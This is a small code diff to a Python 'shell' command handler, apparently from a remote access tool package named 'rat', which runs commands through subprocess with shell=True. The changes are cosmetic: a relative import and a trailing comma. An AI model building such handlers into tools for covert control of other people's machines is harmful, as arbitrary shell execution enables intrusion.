@@ -1,5 +1,6 @@
 import subprocess
-from rat.commands.base_command import BaseCommand
+from .base_command import BaseCommand
+
 
 class ShellCommand(BaseCommand):
     name = "shell"
@@ -16,7 +17,7 @@ class ShellCommand(BaseCommand):
                 shell=True,
                 capture_output=True,
                 text=True,
-                timeout=30           # prevent hanging forever
+                timeout=30,  # prevent hanging forever
             )
             output = result.stdout
             if result.stderr:
